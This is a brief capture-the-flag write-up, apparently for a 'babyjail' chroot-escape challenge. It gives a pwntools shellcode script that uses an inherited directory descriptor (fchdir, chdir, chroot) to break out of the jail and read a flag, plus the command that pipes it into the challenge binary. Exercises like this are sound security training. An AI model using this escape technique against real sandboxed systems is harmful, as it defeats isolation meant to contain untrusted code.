scripts:  
```
from pwn import *
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=shellcraft.fchdir(3)
shellcode+=shellcraft.chdir("../../../")
shellcode+=shellcraft.chroot(".")
shellcode+=shellcraft.cat('flag')
shellcode=asm(shellcode)
sys.stdout.buffer.write(shellcode)
```
the file input should be a directory, fchdir will return error when file is a regular one:
```
ENOTDIR
              fd does not refer to a directory.
```
last:  
`python3 resolve.py | /challenge/babyjail_level3 /home/hacker/`
